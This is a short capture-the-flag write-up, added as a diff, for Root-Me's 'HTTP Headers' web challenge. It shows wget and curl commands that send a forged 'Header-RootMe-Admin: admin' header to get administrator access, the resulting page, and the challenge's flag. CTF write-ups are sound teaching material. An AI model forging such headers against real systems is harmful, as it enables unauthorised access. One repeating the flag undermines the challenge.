@@ -1,0 +1,31 @@
+Video Solution: https://youtu.be/ZclXIDwt7lc
+Task on RootMe: https://www.root-me.org/en/Challenges/Web-Server/HTTP-Headers
+
+http://challenge01.root-me.org/web-serveur/ch5/
+	
+Solution: Access the problem file using Live http header addon mozilla
+Visible Header-RootMe-Admin response: none
+
+On the matter of asking Get an administrator access to the webpage.
+
+Change the Header-RootMe-Admin response: admin
+
+or can directly wget with wget command
+wget -O index.html --header="Header-RootMe-Admin: admin" http://challenge01.root-me.org/web-serveur/ch5/;cat index.html
+	
+Result : 
+  <html>
+    <body>
+    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
+    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
+    <p>Content is not the only part of an HTTP response!</p>
+    <p>You dit it ! You can validate the challenge with the password HeadersMayBeUseful</p>
+    </body>
+  </html>
+	
+Command curl : 
+	
+curl -H "Header-RootMe-Admin:admin" http://challenge01.root-me.org/web-serveur/ch5/
+	
+Flag : HeadersMayBeUseful
+	
